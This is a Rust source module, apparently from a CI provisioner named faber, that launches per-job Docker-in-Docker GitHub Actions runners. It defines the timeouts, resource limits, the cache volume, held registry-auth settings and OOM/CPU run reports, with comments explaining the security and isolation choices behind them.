//! The Docker provisioning backend — ephemeral, per-job Linux JIT runners.
//!
//! Where the macOS VM backend ([`crate::vm::job`]) runs an `osx-arm64` runner
//! in a per-job VM, the Docker backend runs a **linux** runner inside a
//! throwaway container. Each job gets its own private Docker network, its own
//! Docker-in-Docker (`dind`) daemon, and its own runner container:
//!
//! ```text
//! network create  →  dind (alias `dind`, named /var/lib/docker volume)
//!                 →  runner (--rm, one JIT job)
//!                 →  teardown (containers, network, volume)
//! ```
//!
//! The `dind` daemon is network-aliased `dind` so a job that expects
//! `DOCKER_HOST=tcp://dind:2375` (and reaches its service containers via the
//! `dind` hostname) runs unchanged — this is a drop-in for an always-on
//! `docker compose` runner farm, but on demand and per-job isolated (two
//! concurrent jobs can no longer collide on a shared dind's published ports).
//!
//! The runner image must honour faber's JIT contract: faber sets
//! `RUNNER_JITCONFIG` in the container's environment, and the entrypoint must
//! hand it to `./run.sh` as the runner user through the environment too —
//! GitHub's runner reads `ACTIONS_RUNNER_INPUT_JITCONFIG` as `--jitconfig`'s
//! fallback — never as a `--jitconfig` argument, which `/proc/<pid>/cmdline`
//! would make world-readable to every local account on a native Linux dockerd
//! host (a security review's finding against `docker/runner/entrypoint.sh`,
//! fixed there). faber therefore never has to know the image's internals,
//! only that it keeps the secret off argv the same way.
//!
//! Teardown covers every in-process path; what a crashed faber or a Docker
//! daemon restart leaks is reaped later by [`crate::sweep`].
//!
//! The one deliberate exception to "everything is per-job" is the opt-in build
//! cache ([`CACHE_MOUNT`], `cache_volume = true`): a per-repo named volume that
//! outlives every job so a workflow can keep a dependency tree on local disk
//! instead of round-tripping it through a remote cache service on every run. It
//! is mounted at a dedicated path *outside* the runner's `_work` tree, so the
//! job workspace — checkout, `_temp`, `_tool`, `_actions` — stays as ephemeral
//! as it has always been. See [`cache_volume_name`] and ADR-0005.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::path::Path;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use tokio::process::Command;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::cpu::{CpuStat, CpuTally};
use crate::footprint::IoBytes;
use crate::github::{Deregistration, Github};
use crate::untrusted;

/// How long to wait for the per-job dind daemon to accept connections.
const DIND_READY_TIMEOUT: Duration = Duration::from_secs(60);
/// Poll interval while waiting for dind.
const DIND_POLL: Duration = Duration::from_secs(1);
/// Interval between per-job memory samples (`docker stats`) while a job runs.
const STATS_POLL: Duration = Duration::from_secs(3);

/// Cap on any *short-lived* `docker` CLI call — `info`, `stats`, an `inspect`, an
/// `ls`: metadata operations against the local daemon that answer in
/// milliseconds whenever Docker is healthy.
///
/// Unbounded, these do not fail when the daemon wedges (a crashed VM, a full host
/// disk) — the client blocks on its socket *forever*. Every poll then strands one
/// `docker` process per job, so one outage quietly accumulates hundreds of them
/// while faber's own state stops converging. The cap turns an invisible pile-up
/// into a fast, logged error.
///
/// Calls that *move data* rather than answer a question must not be squeezed into
/// this budget — see [`TEARDOWN_TIMEOUT`] and [`LAUNCH_TIMEOUT`].
pub(crate) const CLI_TIMEOUT: Duration = Duration::from_secs(20);

/// Cap on a *teardown* call — `rm -f`, `network rm`, `volume rm`, `volume prune`,
/// `kill`.
///
/// Teardown is not a metadata operation and sharing [`CLI_TIMEOUT`] with one was a
/// leak, not a cosmetic mismatch. Force-removing a runner or dind deletes a
/// writable layer holding that job's image pulls, which on a loaded daemon
/// routinely runs tens of seconds. Bounded at 20s, faber gave up and moved
/// straight on to `volume rm` — which the daemon then refused, `volume is in
/// use`, because the container it had *not yet finished* deleting still mounted
/// it. Every such teardown abandoned a multi-GB dind volume, and abandoned
/// volumes only grow `Docker.raw` (sparse: it never shrinks). That closes a
/// feedback loop — fuller host disk, slower daemon, more teardowns over the cap,
/// more abandoned volumes — which has ended in a dead Docker VM.
///
/// Cleanup is not latency-sensitive, so it gets a wide budget. It keeps a bound
/// regardless, because the unbounded hang this whole mechanism exists for is a
/// real failure mode.
pub(crate) const TEARDOWN_TIMEOUT: Duration = Duration::from_secs(120);

/// Cap on the calls that *build* the sandbox (`network create`, `run -d`). Like
/// teardown they create real state rather than answer a question, and a timed-out
/// `run -d` is the same false negative in the other direction: faber reports an
/// infra fault and abandons a dind (plus its volume) the daemon went on to start.
/// Named separately from [`TEARDOWN_TIMEOUT`] because it bounds the provisioning
/// path, not the cleanup one.
pub(crate) const LAUNCH_TIMEOUT: Duration = Duration::from_secs(120);

/// After a removal overruns [`TEARDOWN_TIMEOUT`], how long to keep re-probing
/// before calling it failed. A timed-out `rm -f` is not necessarily a failed one:
/// the daemon usually finishes the removal moments after the client stops
/// waiting, so the real state has to be *checked*, not assumed.
const REMOVE_CONFIRM: Duration = Duration::from_secs(60);
/// Poll interval while confirming a removal.
const REMOVE_POLL: Duration = Duration::from_secs(2);

/// How many times teardown re-attempts a `volume rm` the daemon refuses as
/// `in use`. The dind that mounts it may still be mid-removal, so that refusal is
/// a race to wait out, not a verdict to log and walk away from.
const VOLUME_RM_ATTEMPTS: u32 = 4;
/// Pause between those attempts.
const VOLUME_RM_BACKOFF: Duration = Duration::from_secs(5);

/// Cap for the `MemAvailable` probe, which runs a throwaway container and may
/// have to pull `probe_image` on a cold host — far slower than a metadata call,
/// so it gets its own budget rather than widening [`CLI_TIMEOUT`] for everyone.
const PROBE_TIMEOUT: Duration = Duration::from_secs(180);

/// Cap on a single `docker exec <dind> docker info` readiness probe. Without it a
/// wedged daemon blocks the very first attempt forever and the enclosing
/// [`DIND_READY_TIMEOUT`] deadline is never reached.
const DIND_EXEC_TIMEOUT: Duration = Duration::from_secs(10);

/// Default cap on a single runner container's lifetime (provision → exit).
///
/// A JIT runner exits only *after* completing a job; a **surplus** runner —
/// provisioned for a job another runner already claimed (JIT runners aren't
/// pinned to a job) — never gets one and would sit `Listening for Jobs`,
/// sitting `Listening for Jobs` forever. This backstop kills such a
/// runner (and a job that hangs past any sane duration) so it can't leak the
/// container + dind indefinitely. Sized well above the longest real CI job —
/// GitHub already bounds a running job at its own `timeout-minutes` — so it only
/// ever fires on a genuinely stuck/idle runner. Tune via `runner_timeout_secs`;
/// `0` disables the cap (the historical unbounded behavior).
pub const DEFAULT_RUNNER_TIMEOUT: Duration = Duration::from_secs(3 * 60 * 60);

/// Where the opt-in persistent build cache is mounted inside the runner
/// container (`cache_volume = true`).
///
/// Deliberately a dedicated path, NOT the runner's `_work` tree. Mounting `_work`
/// would make the checkout, `_temp`, `_tool` and `_actions` shared mutable state
/// across every job on the host — the cross-job contamination the per-job sandbox
/// exists to prevent. Only this one directory persists, and only workflows that
/// opt into reading it are affected.
///
/// `/runner` is the conventional install dir for the actions runner (it is where
/// `run.sh` lives), so a sibling `_cache` sits next to `_work` without colliding
/// with anything the runner itself manages.
///
/// OWNERSHIP IS THE CONSUMER'S JOB. Docker creates a mount point that the image
/// does not already contain as `root:root 0755`, so on the very first job this
/// directory is **not writable by the unprivileged user the runner executes as**
/// (verified against a real runner image: uid 1001 `runner` gets
/// `Permission denied`). faber cannot fix this for you — it has no idea which uid
/// your image runs jobs as. Take ownership once, either in the image's entrypoint
/// while it is still root, or from the job itself if the image grants sudo; the
/// new ownership lives in the volume, so every later job finds it already correct.
pub const CACHE_MOUNT: &str = "/runner/_cache";

/// Env var faber injects into the runner container naming [`CACHE_MOUNT`], set
/// only when the cache volume is actually mounted.
///
/// The variable IS the contract. A workflow must key its cache logic off this
/// being set rather than probing for the path, because a path can exist for
/// unrelated reasons — a runner image that happens to create the directory, say —
/// and a probe that passes for the wrong reason degrades to a silent permanent
/// miss that looks exactly like a hit-less cache working as designed. If faber
/// did not mount a volume, this is absent, and the workflow can say so out loud.
pub const CACHE_DIR_ENV: &str = "FABER_CACHE_DIR";

/// Docker Hub's canonical key in a `config.json` — what `docker login` with no
/// argument writes, so it is what an operator's existing file will be keyed by.
pub const DEFAULT_REGISTRY_SERVER: &str = "https://index.docker.io/v1/";

/// Default name of the environment variable holding the registry secret. The
/// *name* is config; the *value* never is (see [`RegistryAuth`]).
pub const DEFAULT_REGISTRY_PASSWORD_ENV: &str = "FABER_REGISTRY_PASSWORD";

/// The namespace `password_env` must live in (issue #191). While registry auth
/// ran, the variable's value was copied into a per-job `config.json` that job code
/// could read, so letting config name *any* variable would have let a settings
/// save copy an unrelated secret from faber's own environment into every job.
/// [`RegistryAuth`] is held and reads no variable today; the name is still
/// checked, so a held section cannot carry a name that would leak once it returns.
pub const REGISTRY_ENV_PREFIX: &str = "FABER_REGISTRY_";

/// Why `name` is not an acceptable `registry_auth.password_env`, or `None` when
/// it is (or is blank, which other checks handle). It must be `FABER_REGISTRY_`
/// followed by at least one of `A-Z`, `0-9`, `_`.
pub fn password_env_problem(name: &str) -> Option<String> {
    let name = name.trim();
    if name.is_empty() {
        return None;
    }
    let ok = name.strip_prefix(REGISTRY_ENV_PREFIX).is_some_and(|rest| {
        !rest.is_empty()
            && rest
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
    });
    (!ok).then(|| {
        format!(
            "registry_auth.password_env {name:?} must be a variable named {REGISTRY_ENV_PREFIX}<NAME> \
             (upper-case letters, digits, underscores): faber copies its value into every job, so it \
             only reads variables in its own namespace"
        )
    })
}

/// Registry credentials for the images a **job** pulls (`[registry_auth]`). HELD.
///
/// The section still parses, so a config that carries it boots, but faber acts on
/// none of it: no credential is resolved, no volume is filled or mounted, and no
/// `DOCKER_CONFIG` is set. The only way to authenticate a pull the job's own
/// client makes is to hand that client the credential, and a credential mounted
/// into a job can be read by the job's code; the one credential faber lets reach
/// job code is the runner's own JIT config (ADR-0025). The section returns when
/// faber pulls images for the job, so that no credential enters it.
/// [`crate::config::FileConfig::validate`] refuses `enabled = true` where a human
/// is looking; a daemon that boots with it warns
/// ([`crate::config::registry_auth_held_warning`]) and pulls anonymously.
///
/// Absent or `enabled = false` — the default — is faber's historical behavior
/// exactly: every pull inside dind is anonymous, and Docker Hub meters those
/// against a quota keyed to this host's *public IP* (a small allowance, shared
/// with everything else behind that address, and invisible to the host).
/// A CI provisioner that depends on registry pulls while supplying no credentials
/// is subject to a budget it can neither see nor influence; this makes supplying
/// one possible, not mandatory.
///
/// NOTE WHAT IS ABSENT: there is no `password` key. The secret was named here and
/// read from the environment or the operator's own `~/.docker/config.json` at
/// launch — never a field, because `config.toml` is a file the settings page
/// rewrites, the dashboard serves, and an operator may check in.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct RegistryAuth {
    /// Master switch. Off by default, and refused on while the section is held:
    /// a daemon that boots with it on warns and does nothing with it.
    #[serde(default)]
    pub enabled: bool,
    /// The registry to authenticate to, as keyed in a `config.json`.
    #[serde(default = "default_registry_server")]
    pub server: String,
    /// The account to authenticate as. Blank means "take it from
    /// `~/.docker/config.json`", which is the zero-configuration path.
    #[serde(default)]
    pub username: String,
    /// The *name* of the environment variable holding the secret — for a launchd
    /// daemon, an `EnvironmentVariables` entry in the plist.
    #[serde(default = "default_registry_password_env")]
    pub password_env: String,
}

fn default_registry_server() -> String {
    DEFAULT_REGISTRY_SERVER.to_string()
}

fn default_registry_password_env() -> String {
    DEFAULT_REGISTRY_PASSWORD_ENV.to_string()
}

impl Default for RegistryAuth {
    fn default() -> Self {
        Self {
            enabled: false,
            server: default_registry_server(),
            username: String::new(),
            password_env: default_registry_password_env(),
        }
    }
}

/// The name of the persistent cache volume for `owner_repo`.
///
/// Scoped **per repo**: faber can service many repos from one host, and a single
/// shared volume would let any of them read and overwrite another's cache. Per
/// repo, the blast radius is exactly the isolation GitHub's own cache service
/// gives across repos.
///
/// Within a repo the volume is shared across refs — that is the entire point (a
/// PR job must be able to read what a main job wrote), and it is only defensible
/// because [`crate::gate`] refuses public repos and fork-PR provenance outright,
/// so nothing that reaches this volume is untrusted code.
///
/// It is marked [`KIND_CACHE`], which is not one of [`crate::sweep`]'s per-job
/// kinds, so the janitor's volume listing excludes it outright and its orphan
/// filter rejects it even when the legacy name listing turns it up — a volume
/// that must outlive every job must never look like one that belongs to a
/// finished one. `sweep::tests` pins that from both directions.
pub fn cache_volume_name(owner_repo: &str) -> String {
    format!("faber-cache-{}", volume_slug(owner_repo))
}

/// `owner_repo` folded into Docker's volume-name alphabet, for the per-repo
/// volumes: the build cache here, and the git mirror ([`crate::git_mirror`]).
pub(crate) fn volume_slug(owner_repo: &str) -> String {
    // Docker volume names are `[a-zA-Z0-9][a-zA-Z0-9_.-]*`; `owner/repo` carries a
    // `/`, and repo names may carry `.`/`_`/`-`. Fold anything else to `-` so an
    // exotic name can't produce an argv Docker rejects.
    owner_repo
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '.' || c == '_' {
                c.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect()
}

/// Whether a profile's jobs are handed a Docker daemon of their own.
///
/// This is a **privilege grant**, not a convenience toggle, and it is the single
/// widest one faber makes. The runner container is unprivileged, but a granted
/// profile also starts a `--privileged` dind sibling whose API is plain,
/// unauthenticated TCP on the job's own network, and hands the job
/// `DOCKER_HOST=tcp://dind:2375`. Any job that reaches that daemon can start a
/// container on it that mounts the host disk, so it is host root — on macOS,
/// root inside faber's Linux VM (ADR-0026); on Linux, root on the machine. The
/// unprivileged runner container is a convenience, never a boundary (issue #43).
///
/// Most jobs never invoke `docker` at all. For those, denying the grant removes
/// the privileged container *and* the unauthenticated daemon from the job's
/// network entirely — there is nothing left to reach.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DindGrant {
    /// The profile asked for a daemon: `dind = true`.
    Granted,
    /// The profile declined one: `dind = false`. No privileged container is
    /// started, no `/var/lib/docker` volume is created, and the runner gets no
    /// `DOCKER_HOST`.
    Denied,
    /// The profile said nothing, on a config written before the key existed.
    ///
    /// Behaves as [`DindGrant::Granted`], because the alternative is worse: this
    /// binary reaches existing hosts through an unattended update (ADR-0006), and
    /// silently withdrawing a capability their workflows already use would break
    /// running CI with no human in the loop. It is *not* the same as `Granted` for
    /// reporting — it is warned about at every startup and shown as its own word
    /// on the dashboard, so "an operator decided this" and "nobody has said yet"
    /// stay distinguishable until the default flips. The audit line records only
    /// the fact (`granted`), because it answers what a past job could reach, not
    /// who chose it. See ADR-0013.
    Unstated,
}

impl DindGrant {
    /// Whether a daemon is actually provided for this profile's jobs.
    pub fn granted(self) -> bool {
        !matches!(self, DindGrant::Denied)
    }

    /// A short, stable word for logs, the dashboard and the audit trail.
    pub fn as_str(self) -> &'static str {
        match self {
            DindGrant::Granted => "granted",
            DindGrant::Denied => "denied",
            DindGrant::Unstated => "unstated",
        }
    }
}

/// Static configuration for a Docker-backed runner profile.
#[derive(Debug, Clone)]
pub struct DockerConfig {
    /// The runner image to launch (must satisfy faber's `RUNNER_JITCONFIG` contract).
    pub image: String,
    /// Whether this profile's jobs get a Docker daemon at all. See [`DindGrant`]
    /// — it is a privilege grant, and the only one that reaches host root.
    pub dind: DindGrant,
    /// The Docker-in-Docker image for the per-job daemon. Unread when
    /// [`DockerConfig::dind`] denies the grant.
    pub dind_image: String,
    /// Extra environment passed into the runner container (e.g.
    /// `PLAYWRIGHT_BROWSERS_PATH`). Ordered for deterministic argv.
    pub env: BTreeMap<String, String>,
    /// Hard cap on the runner container's lifetime; on expiry faber kills it so a
    /// surplus/idle or hung runner can't pin the provision task forever (see
    /// [`DEFAULT_RUNNER_TIMEOUT`]). `Duration::ZERO` = uncapped.
    pub runner_timeout: Duration,
    /// Mount the per-repo persistent build cache at [`CACHE_MOUNT`] (and export
    /// [`CACHE_DIR_ENV`]). Off by default: it is the only state faber lets cross
    /// the job boundary, so an operator opts in per profile rather than inheriting
    /// it. See [`cache_volume_name`] and ADR-0005.
    pub cache_volume: bool,
    /// Mount the repo's git mirror read-only at [`crate::git_mirror::MOUNT`] (and
    /// export [`crate::git_mirror::ENV`]) once its first refresh has finished.
    /// Off by default (ADR-0035 §8).
    pub git_mirror: bool,
    /// Point the runner at the pull-through mirror while it is healthy: connect
    /// it to the job's network and export [`crate::mirror::ENV`]. Off by default,
    /// and inert without `[mirror]`.
    pub mirror: bool,
    /// The block this host carves per-job network subnets from, when the
    /// operator has declared one ([`crate::config::HostPolicy::network_pool`]).
    ///
    /// Host-level rather than per-profile — every profile's networks come out of
    /// the same address space — and carried here because this struct is what
    /// reaches the provisioning path, so a host-wide input has to ride along on it.
    /// (`[registry_auth]` is host-level too, and deliberately absent: it is held,
    /// so nothing that reaches a job carries it — see [`RegistryAuth`].)
    ///
    /// `None` leaves allocation to Docker's own pools, which is what every
    /// release before this one did.
    pub network_pool: Option<crate::netpool::NetPool>,
    /// The services this job declared (ADR-0046), started beside the runner.
    /// Empty for a job that declared none, which provisions exactly as before.
    pub services: crate::services::ServicePlan,
}

impl DockerConfig {
    /// A config for `image` with faber's defaults (an unstated dind grant,
    /// `docker:dind`, no extra env, the [`DEFAULT_RUNNER_TIMEOUT`] lifetime cap,
    /// no cache volume).
    pub fn new(image: String) -> Self {
        Self {
            image,
            dind: DindGrant::Unstated,
            dind_image: "docker:dind".to_string(),
            env: BTreeMap::new(),
            runner_timeout: DEFAULT_RUNNER_TIMEOUT,
            cache_volume: false,
            git_mirror: false,
            mirror: false,
            network_pool: None,
            services: crate::services::ServicePlan::default(),
        }
    }
}

/// A container's CPU and memory ceiling. Both are opt-in: a zero value means
/// "unlimited" (no flag emitted), so an unset profile behaves exactly as before.
///
/// These are per-job *live* tunables, not part of the static [`DockerConfig`]:
/// the daemon reads the current value at launch time, so a change made through
/// the control panel takes effect on the next job without a restart.
#[derive(Debug, Clone, Copy, Default, PartialEq, Serialize, Deserialize)]
pub struct ResourceLimits {
    /// Hard CPU ceiling (Docker `--cpus`). Compressible: a ceiling, not a
    /// reservation, so several jobs may each be sized near the whole VM and the
    /// kernel shares cores under contention. `0.0` = unlimited.
    #[serde(default)]
    pub cpus: f64,
    /// Memory ceiling in MiB (Docker `--memory`, with `--memory-swap` pinned
    /// equal to it so a leaky job OOM-fails fast instead of thrashing swap).
    /// Incompressible: the sum across concurrent containers must fit the VM.
    /// `0` = unlimited.
    #[serde(default)]
    pub memory_mib: u64,
}

impl ResourceLimits {
    /// Append the Docker `run` flags for this ceiling to `args` (nothing when
    /// unset). `--memory-swap` is pinned to `--memory` to disable swap.
    fn push_args(&self, args: &mut Vec<String>) {
        if self.cpus > 0.0 {
            args.push("--cpus".into());
            // `{}` drops the trailing `.0` for whole numbers (Docker accepts both).
            args.push(format!("{}", self.cpus));
        }
        if self.memory_mib > 0 {
            let mem = format!("{}m", self.memory_mib);
            args.push("--memory".into());
            args.push(mem.clone());
            args.push("--memory-swap".into());
            args.push(mem);
        }
    }
}

/// The per-job container ceilings: the runner container (where checkout, build
/// and browser tests run) and its private dind daemon (where `docker build` and
/// service containers run). Sized independently because they carry different
/// loads. All-zero = unlimited, i.e. faber's original unbounded behavior.
#[derive(Debug, Clone, Copy, Default, PartialEq, Serialize, Deserialize)]
pub struct Limits {
    #[serde(default)]
    pub runner: ResourceLimits,
    #[serde(default)]
    pub dind: ResourceLimits,
}

/// What one Docker job run cost, fed back to the autolimiter's per-class learner.
///
/// `job_ok` is the runner's own exit (a failed job is a normal outcome, not a
/// faber error); `oom_*` distinguish a memory kill from an ordinary failure so the
/// learner can force-bump the offending container's cap; `*_peak_mib` are the
/// observed high-water marks (a sampler reads `docker stats` during the run —
/// `None` if sampling never caught a reading).
///
/// Not `Copy`: `cause` carries the human-readable why, and a report is only ever
/// passed by reference or moved once, so the sentence is worth more than the trait.
/// CPU one container used over its run, read from its cgroup's `cpu.stat`
/// (ADR-0019). Millicores: 1000 = one core.
#[derive(Debug, Clone, Copy, Default, PartialEq, Serialize, Deserialize)]
pub struct CpuUsage {
    /// The highest average usage over any one sampling interval.
    pub peak_mcpu: u64,
    /// The average usage across the sampled part of the run.
    pub avg_mcpu: u64,
    /// `nr_throttled / nr_periods`: the share of CFS periods in which the
    /// container hit its `--cpus` quota. `0.0` for a container with no quota.
    pub throttled_ratio: f64,
}

/// A cgroup's `memory.events` OOM counters, hierarchical (the file, not
/// `memory.events.local`): kills and limit breaches anywhere in its subtree.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct MemEvents {
    /// Times a limit in the subtree was breached and the OOM killer invoked.
    pub oom: u64,
    /// Processes in the subtree the OOM killer killed, by any OOM killer.
    pub oom_kill: u64,
}

impl RunReport {
    /// ADR-0033 §5: the runner's / dind's kill was the VM-wide OOM killer's, by
    /// their latched `memory.events`.
    pub fn host_oom_runner(&self) -> bool {
        self.runner_mem_events.is_some_and(MemEvents::is_host_oom)
    }

    pub fn host_oom_dind(&self) -> bool {
        self.dind_mem_events.is_some_and(MemEvents::is_host_oom)
    }
}

impl MemEvents {
    /// ADR-0033 §5: something in the subtree was killed (`oom_kill` rose) with no
    /// limit anywhere in it breached (`oom` did not). The VM-wide OOM killer, not
    /// this container's cap. A nested container hitting its own small limit raises
    /// `oom` in every ancestor, so it is not counted here.
    pub fn is_host_oom(self) -> bool {
        self.oom_kill > 0 && self.oom == 0
    }

    /// The per-counter high-water mark of two readings: both counters only ever
    /// increase, so the maximum of a sparse sample set is what a continuous
    /// observer would have seen (see [`latch`]).
    fn latched(self, reading: MemEvents) -> MemEvents {
        MemEvents {
            oom: self.oom.max(reading.oom),
            oom_kill: self.oom_kill.max(reading.oom_kill),
        }
    }
}

/// Fold a `memory.events` reading into a latched slot.
fn latch_events(slot: &mut Option<MemEvents>, reading: MemEvents) {
    *slot = Some(slot.map_or(reading, |high| high.latched(reading)));
}

/// A runner container that was launched and then could not be waited on: the
/// daemon answered "no such container", or stopped answering. faber never saw it
/// exit, so the run is an `infra_error` — but one that happened *mid-job*, which a
/// setup failure is not. Carried through `anyhow` so the caller can tell the two
/// apart with [`runner_was_lost`] without losing the error chain.
#[derive(Debug)]
pub struct RunnerLost(pub String);

impl std::fmt::Display for RunnerLost {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for RunnerLost {}

/// Whether a backend error is a [`RunnerLost`] anywhere in its chain.
pub fn runner_was_lost(e: &anyhow::Error) -> bool {
    e.chain().any(|c| c.downcast_ref::<RunnerLost>().is_some())
}

#[derive(Debug, Clone, Default)]
pub struct RunReport {
    pub job_ok: bool,
    pub oom_runner: bool,
    pub oom_dind: bool,
    /// The highest hierarchical `memory.events` counters read from each container's
    /// cgroup during the run (ADR-0033 §5), or `None` when none was ever readable.
    /// Measurement only: they tell a host OOM from a cap breach (see
    /// [`MemEvents::is_host_oom`]) and feed the `host_oom` audit line; the learner
    /// still reads `oom_runner` / `oom_dind` alone.
    pub runner_mem_events: Option<MemEvents>,
    pub dind_mem_events: Option<MemEvents>,
    pub runner_peak_mib: Option<u64>,
    pub dind_peak_mib: Option<u64>,
    /// CPU the runner / dind container used (ADR-0019). `None` when never read.
    pub runner_cpu: Option<CpuUsage>,
    pub dind_cpu: Option<CpuUsage>,
    /// The `--cpus` quotas the two containers ran under, in millicores (`0` = no
    /// quota). The learner censors a throttled sample at this, as it does an OOM
    /// at `applied_*_mib`.
    pub applied_runner_mcpu: u64,
    pub applied_dind_mcpu: u64,
    /// The runner hit its lifetime cap and faber killed it (see
    /// [`DockerConfig::runner_timeout`]) — distinct from an ordinary non-zero job
    /// exit. Not a representative memory sample, so the caller keeps it out of the
    /// autolimiter's learning.
    pub timed_out: bool,
    /// faber reclaimed this runner mid-run via a cooperative cancel — the claim
    /// reconciler found the runner idle for a job that no longer needs it (see
    /// `reconcile::reconcile_claims`). Like `timed_out` it ran no representative
    /// job, so it is kept out of the learner; unlike it, it is a clean reclaim,
    /// not a failure, so the outcome is recorded as `reclaimed`, not `failure`.
    pub reclaimed: bool,
    /// faber's *own* infrastructure failed before the job could run — the backend
    /// errored setting up the sandbox (network / dind / JIT mint) or launching the
    /// runner, so no representative job ran. Distinct from a clean non-zero job exit
    /// (a genuine failure): recorded as `infra_error` and kept out of the learner.
    /// Set by the caller's error path ([`crate::reconcile`]), never on the happy path.
    pub infra_error: bool,
    /// The runner container was launched and then vanished without an exit status
    /// — the Docker daemon or VM under it restarted, or the host slept — so faber
    /// never saw it end and tore down what was left ([`RunnerLost`]). Set by the
    /// caller's error path alongside `infra_error`, never on the happy path.
    /// Recorded as the outcome's `end: "lost"`, which is what the auto-retry sweep
    /// reads (ADR-0003, amendment 2026-10-18).
    pub lost: bool,
    /// The `--memory` ceilings the two containers actually ran under.
    ///
    /// Cohort sizing ([`crate::limiter::Limiter::sizing_for`]) can set these
    /// *above* the minted-for class's own cap, so the learner needs them to read an
    /// OOM correctly: the kill happened at the applied ceiling, not at the class's
    /// cap, so the censored sample must be taken from this. Zero on the paths that
    /// never launched a capped container (a `Default`ed report, a macOS VM job).
    pub applied_runner_mib: u64,
    pub applied_dind_mib: u64,
    /// Whether this run actually had a Docker daemon of its own — the fact, not
    /// the policy. Read from the profile's grant on a fresh run and from the
    /// container itself on an adopted one, so it says what was true for *this*
    /// job even if the config has since changed (issue #43).
    ///
    /// `None` when no runner container ever existed — a claim reclaimed part-way
    /// through the ramp — because then no job ran and the question has no answer
    /// rather than a negative one.
    pub dind: Option<bool>,
    /// One line saying **why**, for every ending that isn't a clean success: the
    /// seam a reclaim landed at, the cap a timeout blew, the status a failed
    /// runner exited with, or (set by the caller — see [`crate::reconcile`]) the
    /// error chain behind an `infra_error`. Recorded verbatim as the audit
    /// record's `cause`, which is what lets the log explain a failure by itself.
    ///
    /// `None` on a plain success, where there is nothing to explain.
    pub cause: Option<String>,
    /// The image **tag** the runner container was started from — what faber passed
    /// to `docker run`, after drift healing (ADR-0008) and the pool decision
    /// (ADR-0009) have both had their say, so it names the image that ran rather
    /// than the one the profile declares.
    ///
    /// `None` when no container was launched: an infra error earlier in the ramp,
    /// a reclaim while provisioning, or a macOS VM job, which has no runner image.
    pub image: Option<String>,
    /// The image content id (`sha256:…`) the runner container actually ran, read
    /// back off the container after it exited.
    ///
    /// Read from the *container*, not from the tag faber asked for, because those
    /// are different questions: a tag is a mutable pointer, and the whole class of
    /// bug this exists to diagnose is a job failing on toolchain content its image
    /// was not supposed to be carrying. Asking the container is the only answer
    /// that stays true after somebody retags.
    ///
    /// `None` when no container was ever created, or the inspect failed — this is
    /// diagnostics and must never be the reason a run is reported differently.
    pub image_id: Option<String>,
    /// The services the runner had ([`crate::services::ServiceSpec::name`]),
    /// recorded as the outcome's `services`. Empty when it had none.
    pub services: Vec<String>,
    /// CPU time each container lost to its own quota, in microseconds, as of the
    /// last sample (ADR-0056 §4). `None` when never read.
    pub runner_throttled_usec: Option<u64>,
    pub dind_throttled_usec: Option<u64>,
    /// Block and network bytes each container moved, as of the last sample.
    pub runner_io: Option<IoBytes>,
    pub dind_io: Option<IoBytes>,
    /// When the runner started: the container on Docker, the runner inside the
    /// booted clone on a macOS VM (ADR-0056 §2). `None` for an adopted run, and
    /// for one that never got that far.
    pub container_started_ms: Option<u64>,
}

/// Probe the Docker VM's total memory (MiB) via `docker info`. This is the hard
/// ceiling the per-job memory budget is carved out of; re-probed periodically so
/// a resize of the VM is tracked without a restart.
pub async fn probe_mem_total_mib() -> anyhow::Result<u64> {
    let out = docker_output(&["info", "--format", "{{.MemTotal}}"], CLI_TIMEOUT).await?;
    if !out.status.success() {
        anyhow::bail!("docker info failed: {}", stderr_of(&out));
    }
    mem_total_mib(&String::from_utf8_lossy(&out.stdout))
}

/// `docker info`'s `MemTotal` (bytes) as MiB, refused outside the range a VM can
/// have (#105): the budget is carved out of this figure, so a daemon that names a
/// figure no VM has must not get to size it.
fn mem_total_mib(text: &str) -> anyhow::Result<u64> {
    let bytes = untrusted::number(text.trim())
        .ok_or_else(|| anyhow::anyhow!("docker info's MemTotal is not a number"))?;
    anyhow::ensure!(
        (MIN_VM_BYTES..=untrusted::MAX_MEM_BYTES).contains(&bytes),
        "docker info reported {bytes} bytes of memory, which no VM faber runs on has"
    );
    Ok(bytes / (1024 * 1024))
}

/// The least memory a VM faber is willing to size a budget for: 64 MiB. Below
/// that the reading is not a VM's.
const MIN_VM_BYTES: u64 = 64 << 20;

/// Probe the Docker VM's CPU count via `docker info` (ADR-0019): the base of the
/// CPU budget, re-probed with the memory total so a resize of the VM is tracked
/// without a restart.
pub async fn probe_ncpu() -> anyhow::Result<u64> {
    let out = docker_output(&["info", "--format", "{{.NCPU}}"], CLI_TIMEOUT).await?;
    if !out.status.success() {
        anyhow::bail!("docker info failed: {}", stderr_of(&out));
    }
    ncpu(&String::from_utf8_lossy(&out.stdout))
}

/// `docker info`'s `NCPU`, refused outside `1..=MAX_CPUS` for the same reason as
/// [`mem_total_mib`].
fn ncpu(text: &str) -> anyhow::Result<u64> {
    let n = untrusted::number(text.trim())
        .ok_or_else(|| anyhow::anyhow!("docker info's NCPU is not a number"))?;
    anyhow::ensure!(
        (1..=untrusted::MAX_CPUS).contains(&n),
        "docker info reported {n} CPUs, which no VM faber runs on has"
    );
    Ok(n)
}

/// A Docker `--cpus` value as millicores (`0.0` = no quota = `0`).
pub fn mcpu(cpus: f64) -> u64 {
    if cpus > 0.0 {
        (cpus * 1000.0).round() as u64
    } else {
        0
    }
}

/// One live-pressure reading of the VM, for the autolimiter's feedback gates.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct VmPressure {
    /// `MemAvailable` (MiB) — Gate 2's memory signal.
    pub mem_available_mib: u64,
    /// `/proc/pressure/cpu` `some avg60` (percent), or `None` when the kernel
    /// exposes no PSI or the line could not be read — the CPU pressure gate then
    /// fails open (ADR-0019).
    pub cpu_some_avg60: Option<f64>,
}

